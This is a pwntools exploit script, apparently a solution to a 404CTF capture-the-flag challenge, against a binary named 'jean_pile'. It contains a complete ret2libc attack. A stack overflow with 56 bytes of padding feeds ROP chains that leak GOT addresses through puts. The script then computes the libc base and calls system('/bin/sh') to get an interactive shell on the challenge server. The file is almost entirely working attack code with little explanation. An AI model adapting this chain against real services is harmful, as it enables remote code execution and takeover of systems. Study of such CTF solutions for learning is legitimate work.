from pwn import *

elf = context.binary = ELF('./jean_pile')

if args.REMOTE:
    host, port = "challenges.404ctf.fr", "31957"
    p = remote(host,port)
    libc__puts = 0x077980
    libc__str_bin_sh = 0x196031
    libc__system = 0x04c490
else:
    p = process(elf.path)
    libc__puts = 0x080e50
    libc__str_bin_sh = 0x1d8678
    libc__system = 0x050d70

p.recvuntil(b'>>> ')

# ===========================
# ROP Gadget
# ===========================
# $ROPgadget --binary jean_pile | grep rdi
# 0x0000000000400b83 : pop rdi ; ret
ROP_RDI = 0x400b83

# $ ROPgadget --binary jean_pile | grep  ret
# 0x0000000000400646 : ret
ROP_RET = 0x400646


# =========================================
# Construct of rop chain to leak address
# =========================================
# option 1
def construct_rop_chain_option1(symbol:str) -> bytes:
    rop = ROP(elf)
    rop.raw(b'A' * 56)
    rop.puts(elf.got[symbol])
    rop.raw(elf.sym['service'])
    return rop.chain()

# option 2
def construct_rop_chain_option2(symbol:str) -> bytes:
    return flat(
        b'A' * 56,
        ROP_RDI,
        elf.got[symbol],
        elf.plt['puts'],
        elf.sym['service']
    )

# Leak address of symbol
def retrieve_symbol(symbol:str):
    p.sendline(b'1')
    p.recvuntil(b'>> ')
    # make payload (choice 1 option)
    payload = construct_rop_chain_option1(symbol)
    #payload = construct_rop_chain_option2(symbol)
    # send it
    p.sendline(payload)
    # get leak address
    leak_symbol = u64(p.recv(6) + b'\x00\x00')
    log.success(f'{symbol} : {hex(leak_symbol)}')
    p.recvuntil(b'>>> ')
    return leak_symbol
    

def step_leak_addresses():
    # Symbols from :
    # $ readelf -s --wide jean_pile|grep @GLIBC
    retrieve_symbol('__libc_start_main')
    retrieve_symbol('puts')
    retrieve_symbol('printf')
    retrieve_symbol('fgets')
    retrieve_symbol('getchar')
    #retrieve_symbol('fflush')

'''
step_leak_addresses()
p.close()
quit()
'''

# =========================================
# Exploit
# =========================================
def construct_rop_chain_exploit(base_address):
    return flat(
        b'A' * 56,
        ROP_RDI,
        base_address + libc__str_bin_sh,
        ROP_RET,     # to avoid alignment pb
        base_address + libc__system,
        0x0,         # return address is not a pb here -> nul
    )

def exploit(base_address):
    p.sendline(b'1')
    p.recvuntil(b'>> ')
    payload = construct_rop_chain_exploit(base_address)
    p.sendline(payload)
    p.interactive()

def step_get_shell():
    leak_puts = retrieve_symbol('puts')
    base_address = leak_puts - libc__puts
    exploit(base_address)

'''
step_get_shell()
p.close()
quit()
'''

if args.STEP1:
    step_leak_addresses()
else:
    step_get_shell()

p.close()
